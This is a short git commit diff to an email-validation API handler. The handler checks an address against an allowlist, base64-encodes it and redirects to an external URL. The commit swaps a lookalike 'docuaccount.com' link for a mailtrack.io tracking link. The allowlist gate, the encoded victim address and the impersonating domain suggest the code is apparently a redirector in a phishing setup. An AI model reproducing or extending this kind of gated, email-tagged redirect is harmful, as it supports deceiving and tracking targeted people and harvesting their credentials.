0339c41ef6878054baf3b3bf63d0aecd907d18ec
armandabors <146956125+armandabors@users.noreply.github.com>
2025-02-10 03:07:52 -0800

    Update validate-email.js

--- api/validate-email.js
+++ api/validate-email.js
@@ -24,7 +24,7 @@ export default function handler(req, res) {
     // Validate the email
     if (allowedEmailsCache.includes(email)) {
       // Construct the redirect URL
-      const baseURL = "https://Ref910183333.docuaccount.com/o0YWo/?e=";
+      const baseURL = "https://mailtrack.io/l/d151635665667ce66da947b8091a13b40b79f0fc/?e=";
       const encodedEmail = Buffer.from(email).toString("base64");
       const redirectURL = `${baseURL}${encodedEmail}`;
 
